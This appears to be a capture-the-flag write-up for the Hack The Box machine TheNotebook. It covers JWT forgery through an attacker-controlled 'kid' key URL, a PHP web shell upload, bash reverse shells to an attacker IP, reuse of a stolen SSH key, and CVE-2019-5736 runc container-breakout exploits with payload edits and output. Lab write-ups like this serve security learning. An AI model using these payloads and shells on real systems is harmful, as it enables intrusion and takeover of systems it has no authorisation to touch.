# TheNotebook: 10.10.10.230

## Hints

- Getting a shell is a mix of JWT token manipulation and a PHP file upload vulnerability
- Lateral movement is achieved using the hint that "backups" are used!
- Privesc to root is an interesting CVE - finding a stable exploit is a little tricky and watch out for the exploit breaking the Docker container

## nmap

Starting with the usual `nmap` scan. Interesting ports:

```none
22/tcp    open     ssh             OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp    open     http            nginx 1.14.0 (Ubuntu)
```

## 80: Recon

Browsing to port 80, we see a sparse home page with a menu and a couple of links to register or to login.

![Home page](screenshots/80_home.png)

Started the usual `gobuster` in the background to have some enumeration going on in the background.

```none
gobuster dir -t 20 -u 10.10.10.230 -w ~/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -o gobuster_80_root_medium.log
```

Quickly found an `admin` endpoint, which we have a "Forbidden" error message and we can't access. Tried to log in using some goto credentials. Noticed the following error messages.

- `Login Failed! Reason: Incorrect Password`
- `Login Failed! Reason: User doesn't exist.`

Whenever I see such distinct error messages I think of running a `hydra` attack. However, there is no indication of a valid username. So I added that to my notes and went ahead and registered an account - which is open and works. After creating an account, got automatically redirected to a new endpoint named `notes`. I intercepted the registration and the login requests in Burp and noticed there was an `auth` value in the cookie.

![Auth value in cookie](screenshots/80_cookie.png)

Tried to base64 decode the `auth` cookie value and got an incomplete result.

```none
└─$ echo -n "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6Ly9sb2NhbGhvc3Q6NzA3MC9wcml2S2V5LmtleSJ9.eyJ1c2VybmFtZSI6InRvbSIsImVtYWlsIjoidG9tQHRvbS5jb20iLCJhZG1pbl9jYXAiOjB9.ANanZGgEMCncQ_6uFYlaniRp6X9sCX5uqERlerB37Ayw_DAqhEaNOVAOHctLmJJ88mkXhXrvWe2V0VvbkhySorzSazH6Vr2n0hnPuqlRbz_fV_wli_-45eOuAQxGj_9piVh2fmcIjobNuSKBrqE5BWUz52onOK8M3yISUiycFQJDrUkCFRYitI-XE1HTOKhK3UfiRqh3TyPe7wdkrzIujYmRuiVdZCu6SHKok2C5dGTEZcF2nFsq5pg71kdvPR2TF4bcQAMNLale8cNf3tE3oIuiTiVO8_LMc5_iOY4wD-ae9Jwq4v9cd-etLPMk8XWdx0L8E_mpYqe-zA8jf42WU7msXgSNxZynI4iSLcJ8bsu9O-5D8UF8kshDTXiJeWsAEO7bf5AP46r6gy2NZy6Y28F5IQkhgV3ftT9Iy3z-8QZEaYZKuLG79ZNaTsChBiSv6main-p3YMSYOTqkXKkrbm_Fj0IH_PS35mPe3sQHsA_e_UQy5yu8oHAHnFKYAux6aG0HodLW_a26DQwhURh8cofHG5GQr4lqFI2bU16ZEDcxWnnG7wtOU9MiifddNtsMYZzQg81nUC37bXbLMaFT8RKCWfeScDW-Ajec52iCaigDjaPrT95CzXvUalLcNSvPTuQKoEvzsmQPzDPMOocMeEsNv7OYNTRp92XfvHaKnxM" | base64 -d
{"typ":"JWT","alg":"RS256","kid":"http://localhost:7070/privKey.key"}base64: invalid input
```

If we just look at the section of the cookie that was able to be decoded we see a JWT token with some interesting information.

```none
{
  "typ": "JWT",
  "alg": "RS256",
  "kid": "http://localhost:7070/privKey.key"
}
```

Although I have used JWT tokens in the past, I was not knowledgeable about their structure and contents. I did some research and trying to figure more out about them. After a while, I discovered the [jwt.io](https://jwt.io/) website, which provided a nice interface for "messing" with JWT tokens.

A simple base64 decode did not find the "payload" part of the JWT token - which was interesting!

```none
{
  "username": "tom",
  "email": "tom@tom.com",
  "admin_cap": 0
}
```

This is interesting as it seems we could modify a couple of values here to trick the website into thinking we are an admin, then we could access the `10.10.10.230/admin` page. Just setting the `admin_cap` value did not work. Guessing we probably need to change the `admin_cap` value, and use a new private key. Since the `kid` value is a URL, we could create our key, and modify the value in the payload to point to our key hosted on a local webserver.

I started by creating a new private key. I used the same naming conventions to make life easier.

```none
openssl genrsa -out privKey.key 2048
```

Instead of using [jwt.io](https://jwt.io/), I wrote a simple Python script to automate the process. This was just for fun, and to learn a little bit about a popular Python package named [PyJWT](https://pyjwt.readthedocs.io/en/stable/). The script is named [jwt_helper](exploits/jwt_helper) included in the repo. The script is quite simple, and has the following components:

- `privkey` variable with the plaintext string of the private key we just created
- `payload` variable which is a dictionary of the user data with the `admin_cap` set to `1`
- `headers` variable which is a dictionary of the payload, modified to use our private key in the `kid` entry

With this data set, we can use the PyJWT library to encode a payload and print it out.

```none
encoded_token = jwt.encode(payload,
                           privkey,
                           algorithm="RS256",
                           headers=headers)
print(encoded_token)
```

Go back to the website, and make sure you are logged in. Open the browser developer tools, and modify the `auth` cookie value to the new token. Then make sure you have a Python web server started in the same directory as the private key.

```none
python3 -m http.server 8000
```

Make sure the HTTP server has the same port as you put in the JWT headers. Then navigate to the admin page of the website:

```none
http://10.10.10.230/admin
```

And you should be greeted with the admin panel!

![The Notebook Admin Panel](screenshots/80_admin_panel.png)

As a side note... this tricked me for a little. For some reason, I thought the RSA key header and footer wouldn't need to be included. They are essential and it will not work without these. Below is a small snippet of what they look like for reference.

```none
-----BEGIN RSA PRIVATE KEY-----
...
-----END RSA PRIVATE KEY-----
```

## Notes in The Notebook?!

It is hard to enumerate and read when on a roll! But I started the next step by reading all the notes. If I have learned anything on Hack The Box, hints are provided, and they are usually really important. The notes left for us had lots of info!

![Admin notes](screenshots/80_notes.png)

Looking at each note - we get some really useful information.

- **Need to fix config**: Have to fix this issue where PHP files are being executed :/. This can be a potential security issue for the server.
- **Backups are scheduled**: Finally! Regular backups are necessary. Thank god it's all easy on the server.
- **The Notebook Quotes**: Excluded (just a long quote)
- **Is my data safe?**: I wonder is the admin good enough to trust my data with?

## Arbitrary File Upload

The hint about the PHP files being executed was a big hint. Navigating to the file upload page provided a file upload feature with no protection at all, and even provided a nice link to view the file after it was uploaded!

I created a simple file named `cmd.php` with the common PHP payload to accept an HTTP request parameter. Listed the bash oneliner below used to create this file.

```none
echo '<?php system($_REQUEST["cmd"]) ?>' > cmd.php
```

Then uploaded it to the server. As you can see, the web app provides that nice "View" button to see the file!

![Admin notes](screenshots/80_php_upload.png)

Navigating to the uploaded file, and entering a request parameter of `?cmd=id` shows we have command execution and are running as the `www-data` user!

![Admin notes](screenshots/80_code_execution.png)

Did the usual steps to get a reverse shell. Intercepted a request using Burp. Changed request to an HTTP POST. And used the common bash reverse shell.

```none
bash -c 'bash -i >& /dev/tcp/10.10.14.10/9001 0>&1'
```

Success! A reverse shell as the `www-data` user.

```none
└─$ nc -lvnp 9001

```

## Privesc: `www-data` to `noah`

With access to the server, started running linpeas. One thing I have started doing is to get two reverse shells at the same time, so I can have a tool enumerating in the background while doing some manual enumeration at the same time. Remember what I said about hints before? The first thing I did was start looking for backups. I looked around some common places for backups. Then searched for archive files - which had too much-returned data. Then I looked for the word "backup" in the file and directory names using `find`.

```none
find / -name "*backup*" 2> /dev/null
```

And the results.

```none
/usr/src/linux-headers-4.15.0-135-generic/include/config/wm831x/backup.h

/var/backups
/sbin/vgcfgbackup
```

After reviewing the results, found something interesting in `/var/backups` - a file called `home.tar.gz`. 

```none
www-data@thenotebook:/var/backups$ ls -la
ls -la
total 64
drwxr-xr-x  2 root root  4096 Jul 31 02:56 .

-rw-r--r--  1 root root  4373 Feb 17 09:02 home.tar.gz
```

I started a Python HTTP server on the target machine, and downloaded the file. Then extracted it and reviewed the contents. There was an `.ssh` folder with the following private key:

```none

We could also determine the username, as the `home` folder, had a subfolder named `noah`. I set the correct permissions on the private key and connected to the server using SSH.

```none
chmod 600 id_rsa
ssh -i id_rsa noah@10.129.179.80
```

Success!

## Privesc Recon: `noah` to `root`

Did the same technique as before. Two SSH sessions, and ran linpeas on one while manually enumerating on the other. Noticed there was an interesting `sudo` entry to run commands in a Docker container.

```none
noah@thenotebook:~$ sudo -l
Matching Defaults entries for noah on thenotebook:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User noah may run the following commands on thenotebook:
    (ALL) NOPASSWD: /usr/bin/docker exec -it webapp-dev01*
```

Started by getting a Bash shell in the container and having a look around.

```none
sudo docker exec -it webapp-dev01 /bin/bash
```

Couldn't find much, apart from noticing that the web app is served from this Docker container. I haven't exploited Docker much so was at a loss of how to approach this. I exited the container and had a look at the Docker configuration on the machine.

```none
noah@thenotebook:~$ docker --version
Docker version 18.06.0-ce, build 0ffa825
```

I tried to run some other Docker commands to find containers, images etc. - but did not have the right to do that. At points like these, I try to stick to my enumeration method - which leads to a search for exploits against the identified version.

```none

---------------------------------------------------------------------------------- ---------------------------------
```

The last two entries looked interesting. A "container breakout" - which I guess means that the exploit can escape the container and run commands on the host system. Since Docker is running as `root` the resultant code execution would (I guess?!) be root. The CVE reference number is: `CVE-2019-5736`.

## Privesc: `noah` to `root`

Even though this method failed, I thought I would document it for reference. There are two exploits in Exploit DB that are quite similar. I choose the first - `46359`. I followed the instructions in the exploit documentation, starting with downloading the exploits ZIP archive.

```none
wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/46359.zip
unzip 46359.zip
```

The instructions provided in the readme:

```none
# Usage
Edit HOST inside `payload.c`, compile with `make`. Start `nc` and run `pwn.sh` inside the container.
```

Start by editing the `payload.c` file, specifically the `HOST` value.

```none
#define HOST "10.10.14.5"
```

Started a Python webserver on the attacker's machine. We want to upload all the source code and compile in the Docker container on the target. In the SSH session as the `noah` user, get a shell in the container.

```none
sudo /usr/bin/docker exec -it webapp-dev01 /bin/bash
```

In the same shell in the container, fetch all the exploit files. A total of 4 are required.

```none
wget http://10.10.14.127:8000/Makefile
wget http://10.10.14.127:8000/exploit.c
wget http://10.10.14.127:8000/payload.c
wget http://10.10.14.127:8000/pwn.sh
```

Now we have the source code, we need to compile the code using `make`.

```none
# make
gcc -s exploit.c -o exploit -Wall
gcc -s payload.c -o payload -Wall
```

At this point, make sure to start a netcat listener on the target machine. The default port for the exploit is `4455` - but you can change it. We should be good-to-go, and should be able to run `pwn.sh`. 

```none
root@60d1b1c6f841:/opt/webapp/rev# bash pwn.sh 
starting exploit
Successfuly opened /proc/12055/exe at fd 4
/proc/self/fd/4
Successfully openned runc binary as WRONLY
Payload deployed
starting exploit
Successfuly opened /proc/15581/exe at fd 4
/proc/self/fd/4
Successfully openned runc binary as WRONLY
Payload deployed
```

After the payload is deployed, trigger the reverse shell by entering the container using `sh`.

```none
sudo /usr/bin/docker exec -it webapp-dev01 /bin/sh
```

After running the command above, should get access to a `root` shell.

```none
└─$ nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.14.127] from (UNKNOWN) [10.129.192.14] 42910
sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
# wc -c /root/root.txt
33 /root/root.txt
```

I had a little trouble with this exploit. It didn't work the first few times, and I had to reset the machine. After a little tinkering I got it running - but with a very short shell lifetime. Since `/bin/sh` is overwritten in the exploit, remember you can enter the container again using `/bin/bash` too!

## Privesc Alternative: `noah` to `root`

After not getting a stable shell, decided to try another exploit. When searching for `CVE-2019-5736 github` I found the [CVE-2019-5736-PoC](https://github.com/Frichetten/CVE-2019-5736-PoC) repo, which was written in Golang. After some more research, I found an article on HackTricks on the same [Runc exploit (CVE-2019-5736)](https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout#runc-exploit-cve-2019-5736). This article also linked to the same [exploit written in Go](https://github.com/Frichetten/CVE-2019-5736-PoC/blob/master/main.go). Thought I might try it out.

My install of Kali doesn't come with Golang, so started by installed it from the package repository.

```none
sudo apt install golang-go
```

Then downloaded the PoC code.

```none
wget https://github.com/Frichetten/CVE-2019-5736-PoC/blob/master/main.go
```

The instructions on the repo noted that the only change needed is to the `payload` variable - to set the command to be executed. I changed the payload to the following reverse bash shell.

```none
var payload = "#!/bin/bash \n bash -i >& /dev/tcp/10.10.14.3/9001 0>&1"
```

Then build the source.

```none
go build main.go
```

This gives us a binary named `main`. Started a Python HTTP server on the attacker's machine, in the same file with the compiled `main` program. On the target machine, in the existing SSH session, entered the Docker container.

```none
sudo /usr/bin/docker exec -it webapp-dev01 /bin/bash
```

Then fetch the exploit, and make it executable.

```none
wget http://10.10.14.127:8000/main
chmod +x main
```

At this point, it is good to have a few things ready.

- Netcat listener on the attacker system
- One SSH session on the target ready to run the exploit
- Another SSH session on the target is ready to run a command in the container

Now, run the exploit in the container.

```none
./main
```

Then, on the other SSH session on the target, run `sh` - also in the container.

```none
sudo docker exec -it webapp-dev01 /bin/sh
```

This should be done right after seeing:

```none
[+] Overwritten /bin/sh successfully
```

Then the netcat session will have a connection as the `root` user.

```none

## Lessons Learned

- Tring a couple of different exploits for the same vulnerability helps with understanding the exploit, and how it works
- If doing the same thing multiple times, try to get a workflow going where you can automate it. The example from this machine was the generation of the modified JWT token
- Continue spawning multiple shells or SSH sessions - with the general rule of two shells where one is an automated tool, and the other is for manual enumeration
